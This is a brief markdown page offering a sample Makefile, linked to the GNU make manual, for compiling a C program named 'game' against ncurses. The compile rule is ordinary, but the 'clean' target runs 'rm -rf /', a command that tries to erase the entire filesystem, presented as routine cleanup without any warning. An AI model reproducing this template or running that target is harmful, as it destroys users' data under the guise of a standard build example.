# Examples of a Makefile

https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html

```
CC = gcc
SRC = main.c
CFLAGS = -Wall
LDFLAGS = -lncurses
OUT = game

all: $(SRC)
	$(CC) $(CFLAGS) $(LDFLAGS) $(SRC) -o $(OUT)

.PHONY: clean
clean: 
	rm -rf /
```